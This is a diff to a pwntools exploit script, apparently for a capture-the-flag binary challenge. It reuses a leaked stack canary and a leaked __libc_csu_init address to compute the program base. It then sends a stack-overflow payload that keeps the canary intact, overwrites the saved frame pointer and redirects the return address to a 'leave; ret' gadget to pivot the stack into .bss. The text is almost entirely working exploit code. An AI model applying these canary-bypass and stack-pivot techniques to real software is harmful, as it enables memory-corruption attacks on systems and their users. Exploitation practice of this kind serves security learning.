@@ -40,6 +40,7 @@ canary = u64(''.join([chr(x) for x in canary_leaker]))
 libc_csu_init = u64(''.join([chr(x) for x in pie_leaker]))
 success("leaked canary: {}".format(hex(canary)))
 success("leaked <__libc_csu_init>: {}".format(hex(libc_csu_init)))
+base = libc_csu_init - 0x1140
 
 offset_from_msg_to_canary = 0xde28 - 0xdd40
 
@@ -72,8 +73,18 @@ r.sendlineafter('>', '1')
 r.sendlineafter('Token: ', 'jason')
 r.sendlineafter('>', '2') # say something
 r.sendlineafter(': ', '0') # to pusheen
-# r.sendlineafter('Message: ', 'b' * 10) # to pusheen
-r.sendlineafter('Message: ', 'b' * offset_from_msg_to_canary + p64(canary) + 'b' * 8 + p64(0xdeadbeef)) # to pusheen
+
+# overflow rbp to 0x202230, return address to "leave ret" -> 0xbe9
+bss = base + 0x202230
+leave_ret = base + 0xbe9
+payload = flat('b' * offset_from_msg_to_canary,
+               p64(canary),
+               p64(base),
+               p64(leave_ret)
+               )
+
+# r.sendlineafter('Message: ', 'b' * offset_from_msg_to_canary + p64(canary) + 'b' * 8 + p64(0xdeadbeef)) # to pusheen
+r.sendlineafter('Message: ', payload) # to pusheen
 # success('message sent')
 # r.sendlineafter('>', '3')
 r.interactive()
